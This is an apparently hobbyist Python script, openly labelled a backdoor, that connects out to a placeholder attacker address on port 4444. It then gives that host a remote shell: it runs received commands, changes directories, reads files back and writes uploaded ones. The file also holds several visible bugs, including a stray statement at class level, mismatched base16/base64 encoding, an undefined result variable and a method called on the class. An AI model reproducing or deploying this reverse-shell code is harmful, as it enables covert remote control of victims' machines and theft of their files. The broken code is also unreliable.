#!/usr/bin/env python
# -*- encoding: utf-8 -*-

##############################################################################
#                                                                            #
#                                 PY & EH                                    #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
# works on all os's
#  (client/target machine)
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_sys_cmd(self, command):
        return subprocess.check_output(command, shell=True)
    connection.send("\n[+] Connection established.\n")

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File-download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b16encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                result = self.change_working_dir(command[1])
            elif command[0] == "download":
                result == self.read_file(command[1])
            else:
                result = self.execute_sys_cmd(command)
            self.reliable_send(command_result)


my_backdoor = Backdoor("10.10.x.y", 4444)
Backdoor.run()
